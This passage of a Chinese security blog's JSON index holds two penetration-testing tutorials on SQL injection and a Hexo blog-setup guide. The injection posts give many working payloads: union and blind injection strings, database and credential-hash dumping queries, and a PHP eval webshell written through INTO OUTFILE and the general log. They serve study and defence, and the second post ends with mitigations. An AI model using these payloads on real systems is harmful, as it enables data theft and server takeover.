注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用user()进行查看，而且需要注意的是：不是root权限获取不到数据库名。 跨库查询、文件读写以及应用思路 跨库查询 1234567891011# 获取所有数据库名?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata # 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;# 跨库查列?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;# 查结果?id=-1 union select 1,u,p from qqyw.admin 文件读写 会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。 读取函数：load_file() 导出函数：into outfile 或into dumpfile 前提 应该设置--secure-file-priv 否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在secure-file-priv变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。 The MySQL server is running with the --secure-file-priv option so it cannot execute this statement。 应该对web目录需要有写权限，能够使用单引号 应该知道绝对路径 读取数据库路径：@@datadir 文件读取 只能读取绝对路径的网页文件 读取数据库路径：@@datadir 将绝对路径转换为16进制数时，不需要使用引号 语句： 1and 1=2 union select 1,load_file(&#x27;C:\\\\inetpub\\\\wwwroot\\\\mysql-sql\\\\inc\\\\set_sql.php&#x27;),3,4 然后在网页源码中查看 文件导出（写入到文件） 知道路径： 1?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot; 采用PHPmyadmin，选择一个数据库如test，在数据库中新创建一个表aa，在aa中插入一个数据&lt;?php @eval($_POST['123']);?&gt; 1id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+ 路径获取常见方法 报错显示：一般网站出现错误的时候它会泄露出路径； 遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出； 漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径； 平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径； 爆破； 魔术引号及常见保护 php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用GET，POST，cookie所接收的'单引号，&quot;双引号，\\反斜线和NULL字符全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。 编码或宽字节绕过 isset无法绕过，则替换关键字 宽字节绕过0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27，而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句 自定义关键字替换 其他绕过思路见其他文章 权限获取 数据库操作权限获取 提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法： 弱口令爆破 sqlmap注入的--sql-shell模式 进入交互界面后，通过select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码。 网站的数据库配置文件中拿到明文密码信息。文件名一般都有config CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限 Webshell获取 into outfile 知道网站物理路径 高权限数据库用户 load_file()开启 即 secure_file_priv 无限制 可以通过这个查：mysql&gt; show global variables like '%secure_file_priv%'; 值 说明 NULL 不允许导入或导出 /tmp 只允许在/tmp操作 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 网站路径有写入权限 操作 select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;; 1232. ``` sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot; 日志文件写 shell Web 文件夹宽松权限可以写入 Windows 系统下 高权限运行 MySQL 或者 Apache 日志设置查看： 12345678mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;general_loggeneral_log_file# 自定义set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/info.php&#x27;;# 往日志里面写入 payloadselect &#x27;&lt;?php phpinfo();?&gt;&#x27;; MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell： 注： 这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ： Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些 系统命令执行（提权【参考国光】） 查询HASH解密 1234# MySQL &lt;= 5.6 版本mysql&gt; select host, user, password from mysql.user;# MySQL &gt;= 5.7 版本mysql &gt; select host,user,authentication_string from mysql.user; 也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的： UDF提权 反弹端口提权 MOF提权 启动项提权 CVE-2016-6663/6664组合拳 低版本注入配合读取或暴力 小于5.0版本 字典或读取，爆破 ACCESS access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。 面对它只能暴力猜解，没有其他办法。 Access注入时，如果列名或者表名猜解不到的情况怎么办？ Access偏移注入：解决列名获取不到的情况。 and 1=2 报错找到注入点 order by 获取总字段 猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表 猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在 脱库 union select 1,username,passwd,4 from admin MSSQL and 1=2报错 order by N# 获取总字段 猜表名 and exists(select * from manage) 表名manage存在 猜解列名and exists(select id from manage)列名id存在 脱库and exists (select id from manage where id=1 )证明id=1存在 and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8 and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16 可用Burp的Intruder功能辅助猜解 猜解username第1到8位的字符，ASCII转码 admin_mz 猜解password第1到16位的字符，ASCII转码(Burp 爆破) 转ASCII的py脚本： 72e1bfc3f01b7583 MD5解密为97285101 常用参数 @@version，查询当前数据库版本 db_name()，查询当前数据库名称 user,system_user,current_user,user_name，查询当前用户 IS_SRVROLEMEMBER()，查询数据库权限。 @@SERVERNAME：获取有关服务器主机的信息 SQLite 找注入点 and 1=1 order by N 猜字段 4 猜数据库 offset ==&gt;0~2 有三个数据库： WSTMart_reg notice_sybase sqlite_sequence 猜列 共有3个字段： id,name,password 脱库 MongoDB id=1′ 单引号注入报错 闭合语句，查看所有集合 查看指定集合的数据 [0] 代表第一条数据，可递增 DB2 and 1=2 判断注入点 order by N 获取字段数 爆当前数据库：GAME_CHARACTER 列表：NAME 脱库 PostgreSQL and 1=2 判断注入点 order by N 获取字段 爆数据库 列表 列字段 脱库 Sybase数据库 and 1=2 判断注入点 order by N 获取总字段 爆数据库 列表 列字段 查状态：结果为：zhang 反选爆用户名：结果为：mozhe 猜解密码 Oracle and 1=1 order by 爆数据库 列表 列字段 脱库 加上状态：1 where STATUS=1 其他 小tips outfile 和 dumpfile的区别 outfile: 支持多行数据同时导出 使用union联合查询时，要保证两侧查询的列数相同 会在换行符制表符后面追加反斜杠 会在末尾追加换行 dumpfile: 每次只能导出一行数据 不会在换行符制表符后面追加反斜杠 不会在末尾追加换行 因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件；into outfile函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入基础","slug":"SQL注入基础","date":"2023-05-23T02:29:45.000Z","updated":"2023-05-25T01:14:36.391Z","comments":true,"path":"articles/2023/05/23/SQL注入基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"SQL注入基础 基础语法以及函数 基础 12345678910# 查询select * from news where id=$id# 更新update user set pwd=’$p’ where id=2 and username=‘admin’# 添加insert into users(id,url,text) values(2,‘x’,’$t’)# 删除delete from news where id=$id# order byselect id,name,price from news order by $order 其他 123456# 增加字段ALTER TABLE employees ADD phone varchar(20)# 权限控制(grant revoke)grant insert on grant_rights to unauthorized_user# 删表DROP TABLE users; 连接词、联合查询 **union：**联合查询 1select * from table where id = 1 union order by 3 join：连接查询（right/left join），如下搜索两个表相同的字段 1select * from users a join users b where a.id = b.id 注释以及其他符号 注释： 1234/* */ are inline comments-- , # are line commentsExample: SELECT * FROM users WHERE name = &#x27;admin&#x27; -- AND pass = &#x27;pass&#x27; 对于# url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用 所以在URL中使用#进行注入时应该将它转成url编码：%23 在POST请求中就不需要（需要验证） 对于--(空格) 一般在GET请求中，空格会直接被忽略，所以需要把他转化成--%20 还有另外一种方式，就是使用--+，这时候+号会被解释成空格 为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload 对于需要编码转码的#有用，因为只有一个字符，POST最好用这个，其他用--+ 堆叠查询： 123; allows query chainingExample: SELECT * FROM users; DROP TABLE users; 查询可用： 1234&#x27;,+,|| allows string concatenationChar() strings without quotesExample: SELECT * FROM users WHERE name = &#x27;+char(27) OR 1=1 注入原理以及危害 对于传入的搜索内容过滤不严，导致用户可以通过拼接SQL语句，对数据库进行操作。 以下情形均可能产生漏洞： 接收数据 拼接数据 数据库执行 结果展示 他会导致如下危害： 危害数据库里的数据 直接危害网站的权限 我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的 SQL 查询方式 基本注入 这里以mysql注入为例子 信息搜集 主要搜集： 123456789# 操作系统select @@version_compile_os# 数据库版本：select version()select @@version# 数据库名字：select database()# 数据库用户：select user() 在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名） 1234SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，table_schema和table_name分别来存储数据库名和表名information_schema.tables 记录所有的表information_schema.columns 记录所有的列 小知识点： 问：一个@与两个@@有何区别？ 答：一个@是用户自定义变量，两个@是系统变量 手工注入 判断是否能注入，以及注入类型 先看是否输出信息：可以使用'、&quot; 和--+来测试 输出正确、错误与报错信息：都可以 输出正确、报错但不输出错误信息：布尔/时间盲注/报错注入 输出正确但不输出报错和错误信息：布尔/时间盲注 不输出任何信息：时间盲注 12# 或 且 非 三种逻辑判断符id=-1&#x27; and 1=1 判断有几个注入点：id=1' order by 3--+ 判断输出点有几个是可以回显的：id=1' union select 1,2,3 --+ 信息搜集： 获取数据库: 获取此时的数据库：id=-1' union select 1,2,database() --+ 获取全部数据库：id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ 获取表名:id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查询其他数据库表名把database()换成'you_want' 获取列名：id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='you_want --+' 数据获取： 获取单个：id=-1' union select 1,2,[columnname] from [tablename] --+' 获取全部： id=-1' union select 1,2,group_concat([allcolumnname]) from [tablename]--+ -1' union select 1,2,(select concat_ws([column_name]) from [tbname]) --+ 闭合 常用闭合 1234567or 1=1--+ （数字型）&#x27; or 1=1--+ （字符型）&quot; or 1=1--+ （字符型）) or 1=1--+ （MySQL是允许嵌入多个括号的）&#x27;) or 1=1--+&quot;) or 1=1--+&quot;)) or 1=1--+ 非注释闭合 1234|| &#x27;or &#x27;&amp;&amp; &#x27;1&#x27;=&#x27;1;%00 报错and盲注 盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 基于布尔的 SQL 盲注-逻辑判断：regexp，like，ascii，left，ord，mid 基于时间的 SQL 盲注-延时判断：if，sleep 基于报错的 SQL 盲注-报错回显：floor，updatexml，extractvalue 对于报错注入，其payload可以安排在如下位置： 1234567&#x27;or（有效载荷）or&#x27;&#x27;and（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;&#x27;or（有效载荷）and&#x27;=&#x27;&#x27;*（有效载荷）*&#x27;&#x27;or（有效载荷）and&#x27;“ - （有效载荷） - “ 参考： 123456789like ‘ro%’ #判断ro或ro…是否成立regexp ‘^xiaodi[1-z]’ #匹配xiaodi及xiaodi…等if(条件,5,0) #条件成立，返回5，反之，返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从B位置开始，截取字符串a的c长度left(database(),1),database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 涉及资源： 12种报错注入+万能语句 Order by排序注入方法小总结 Insert update 语句：insert into user(username,password) values('$username','$password',) floor：username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ' updatexml：username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or ' extractvalue：username=lwx’ or extractvalue(1,concat(0x7e,database())) or ' delete 在get中需要使用+号或者%20把语句连接起来，避免出错 floor：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1 updatexml：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) extractvalue：GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1 布尔与延时盲注 布尔盲注 id=1' and left(version(),1)=5 --+ id=1' and length(database())=8--+ 延时盲注 id=1 and if((length(database()=8)),sleep(5),1)--+ id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+ 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement 。 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。 其他 基础概念 实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名 待补充…","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"HEXO博客的搭建","slug":"HEXO博客的搭建","date":"2023-05-22T12:03:26.000Z","updated":"2023-06-06T13:37:15.000Z","comments":true,"path":"articles/2023/05/22/HEXO博客的搭建/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/","excerpt":"","text":"安装HEXO和相关插件 hexo的安装 先安装node.js，地址：https://nodejs.org/en 安装完后安装Hexo： 1npm install hexo-cli -g 配置腾讯云节点： 12npm config set registry http://mirrors.cloud.tencent.com/npm/npm config get registry # 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。 主题Pure以及配置 主题：https://github.com/cofess/hexo-theme-pure 先初始化一个文件夹，例如Blog： 1hexo init Blog 加载主题： 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 更新主题： 12cd themes/puregit pull 配置（需要配置根目录config）：参考1，参考2，参考3，参考4 12language: zh-CN # 中文... 写文章 参考，没啥要讲的，指令：hexo n &quot;title&quot;，即可。 模板 模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头： 12345678title: HEXO博客的搭建toc: truesidebar: nonedate: 2023-05-22 20:03:26tags: [博客搭建]categories: [杂]descriptions: 本文介绍hexo搭建博客的心路历程typora-root-url: ..\\..\\.. 上面的typora-root-url很重要！下面说到。 设置分类 由于post文件夹里面的文章太多不好管理，那么只要我们分类一下即可。参考 配置： 12permalink: &#x27;articles/:year/:month/:day/:name/&#x27;new_post_name: &#x27;:year/:month/:title.md&#x27; Hexo与Typora协同 先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。 解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录typora-root-url，让hexo能链接到即可！ 参考 404转发 https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404页面/ 设置更新时间 更新E:\\Blog\\themes\\pure中的_config.yml，添加： display_updated: true 在E:\\Blog\\themes\\pure\\layout\\_partial\\post添加文件updated.ejs 123456&lt;span class=&quot;article-updated&quot;&gt; &lt;i class=&quot;icon icon-calendar-check&quot;&gt;更新于&lt;/i&gt; &lt;a href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt; &lt;time datetime=&quot;&lt;%= date_xml(post.updated) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.updated, date_format) %&gt;&lt;/time&gt; &lt;/a&gt;&lt;/span&gt; 在E:\\Blog\\themes\\pure\\layout\\_partial\\post，更新文件date.ejs 123456&lt;span class=&quot;article-date&quot;&gt; &lt;i class=&quot;icon icon-calendar-check&quot;&gt;创建于&lt;/i&gt; &lt;a href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt; &lt;time datetime=&quot;&lt;%= date_xml(post.date) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.date, date_format) %&gt;&lt;/time&gt; &lt;/a&gt;&lt;/span&gt; 在E:\\Blog\\themes\\pure\\layout\\_partial中的article.ejs的第9行后，添加一段： 1&lt;%- partial(&#x27;post/updated&#x27;, &#123;class_name: &#x27;article-updated&#x27;, date_format: null&#125;) %&gt; 完成 常用指令 123456hexo cleanhexo ghexo d # 推送 或者一起：hugo g -dhexo s # 本地测试hexo n &#x27;title&#x27; 推送hexo d 安装npm install hexo-deployer-git --save 然后配置： 12345deploy: type: git repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io branch: [branch] message: [message] 参考：https://hexo.io/zh-cn/docs/one-command-deployment.html 一些问题 Spawn failed https://blog.csdn.net/Kevin_Carpricron/article/details/124069885 组件推荐 文章加密 https://blog.51cto.com/u_15719567/5476056 代码块魔改 http://blog.iwwee.com/posts/hexo-optimize.html 关于复制代码的那一块参考下面的： https://kangaroohy.com/tools/hexo-theme-pure-optimize.html 评论系统开启 https://valine.js.org/quickstart.html Markdown标题头 https://www.npmjs.com/package/hexo-heading-index 博客优化 npm install hexo-neat --save https://github.com/cofess/hexo-theme-pure/blob/master/README.cn.md 优秀的搭建站点 https://hwame.top/20200520/hello-hexo-configuration.html https://tianbiao.top/29-pure主题配置/index.html 效果","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"开发基础","slug":"开发基础","permalink":"https://j3f5.github.io/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"},{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"},{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试基础","slug":"JAVA安全基础/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"车联网标准","slug":"车联网标准","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"},{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"渗透测试基础","slug":"JAVA安全/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"渗透技巧","slug":"渗透技巧","permalink":"https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"},{"name":"waf绕过","slug":"waf绕过","permalink":"https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"},{"name":"协议","slug":"协议","permalink":"https://j3f5.github.io/tags/%E5%8D%8F%E8%AE%AE/"},{"name":"漏洞发现","slug":"漏洞发现","permalink":"https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"},{"name":"审计技巧","slug":"审计技巧","permalink":"https://j3f5.github.io/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"},{"name":"JWT","slug":"JWT","permalink":"https://j3f5.github.io/tags/JWT/"},{"name":"反序列化","slug":"反序列化","permalink":"https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"},{"name":"XXE","slug":"XXE","permalink":"https://j3f5.github.io/tags/XXE/"},{"name":"业务逻辑","slug":"业务逻辑","permalink":"https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"},{"name":"文件包含","slug":"文件包含","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件读取","slug":"文件读取","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://j3f5.github.io/tags/SSRF/"},{"name":"劫持","slug":"劫持","permalink":"https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"},{"name":"跨域","slug":"跨域","permalink":"https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"},{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"远程服务系统","slug":"远程服务系统","permalink":"https://j3f5.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/"},{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"},{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}